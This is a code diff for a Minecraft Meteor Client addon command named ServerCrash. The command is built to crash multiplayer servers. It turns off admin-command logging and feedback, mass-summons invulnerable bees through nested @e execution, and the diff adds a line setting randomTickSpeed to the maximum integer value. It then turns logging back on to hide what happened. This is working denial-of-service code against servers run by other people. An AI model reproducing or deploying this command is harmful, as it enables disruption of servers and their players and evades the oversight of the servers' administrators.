@@ -7,6 +7,7 @@ import meteordevelopment.meteorclient.utils.player.ChatUtils;
 
 import static com.mojang.brigadier.Command.SINGLE_SUCCESS;
 import static meteordevelopment.meteorclient.MeteorClient.mc;
+import static spigey.asteroide.util.msg;
 import static spigey.asteroide.util.perm;
 
 public class ServerCrash extends Command {
@@ -24,14 +25,15 @@ public class ServerCrash extends Command {
                 error(perm(2));
             }
             if(mc.player.hasPermissionLevel(2)){
-                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
-                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
+                msg("/gamerule logAdminCommands false");
+                msg("/gamerule sendCommandFeedback false");
             }
-            ChatUtils.sendPlayerMsg("/execute as @e as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
+            msg("/execute as @e as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
+            msg("/gamerule randomTickSpeed 2147483647");
             if(mc.player.hasPermissionLevel(2)){
-                ChatUtils.sendPlayerMsg("/save-all");
-                ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback true");
-                ChatUtils.sendPlayerMsg("/gamerule logAdminCommands true");
+                msg("/save-all");
+                msg("/gamerule sendCommandFeedback true");
+                msg("/gamerule logAdminCommands true");
             }
             return SINGLE_SUCCESS;
         });
